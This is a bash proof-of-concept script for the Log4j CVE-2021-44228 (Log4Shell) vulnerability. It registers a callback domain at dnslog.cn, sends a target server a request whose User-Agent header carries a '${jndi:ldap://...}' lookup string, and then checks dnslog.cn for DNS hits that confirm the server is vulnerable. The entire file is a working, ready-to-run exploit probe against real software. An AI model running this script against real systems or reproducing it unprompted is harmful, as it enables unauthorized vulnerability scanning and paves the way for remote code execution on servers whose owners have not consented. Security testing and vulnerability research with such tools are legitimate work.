##########################################################################
# File Name: log4j-poc.sh
# Author: Anaïs Huang
# mail: anaishuangc0conut@gmail.com
# Created Time: Sat 11 Dec 2021 04:16:37 PM CST
#########################################################################
#!/bin/bash
shortDomainFlag=0
localCookieFlag=0

# param process
while getopts ":u:c:d:h" cliName; do
	case "${cliName}" in
		h)
			echo -e "CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2.\nThe impacted version: 2.0 <= Apache log4j2 <= 2.14.1"
			echo -e "This is a poc for it."
			echo -e "Usage:\n\t-u <url of the target>\n\t-d [short domain name]\n\t-c [path to local cookie file]\n\t-h help"
			exit
			;;
		d)
			shortDomain=${OPTARG}
			shortDomainFlag=1
			;;
		c)
			localCookie=${OPTARG}
			localCookieFlag=1
			;;
		u)
			url=${OPTARG}
			;;
		:)
			echo -e "\e[0;31mNo agrument value for option $OPTARG\nExit.\033[0m"
			exit
			;;
		*)
			echo -e "\e[0;31mUnknown option $OPTARG\nExit.\033[0m"
			exit
			;;
	esac
done

if [ $shortDomainFlag -eq 1 ] && [ $localCookieFlag -eq 1 ]; then
	# use the iput short domain name and existed cookie file
	:
elif [ $shortDomainFlag -eq 0 ] && [ $localCookieFlag -eq 0 ]; then
	# get short domain name from dnslog
	# cookie: \b(PHPSESSID=[0-9a-zA-Z]*;)
	# domain name: ^[0-9a-z]*.dnslog.cn
	echo "Applying for new short domain name..."
	shortDomain=`curl -c cookie.txt -s http://www.dnslog.cn/getdomain.php`
else
	echo -e "\e[1;31mError. Use -h for help. Exit.\033[0m"
	exit
fi

echo -n "short domain: "
echo ${shortDomain}""

# send poc in the GET header to target
poc=`printf 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\${jndi:ldap://%s}' ${shortDomain}`
echo "poc: ${poc}"
pocStatus=`curl --user-agent "${poc}" -I -m 10 -o /dev/null -s -w %{http_code} ${url}`

if [ $pocStatus -eq 200 ]; then
	echo -e "\e[1;32mSucc: poc sent\033[0m"
else
	echo -e "\e[1;31mError. Status code: ${pocStatus}"
	exit
fi

# sleep for 60s
sleep 60

# check record
if [ $localCookieFlag -eq 0 ]; then
	#use the cookie applied
	curl -b cookie.txt -v http://www.dnslog.cn/getrecords.php
else
	#use the existed cookie file
	curl -b $localCookie -v http://www.dnslog.cn/getrecords.php
fi
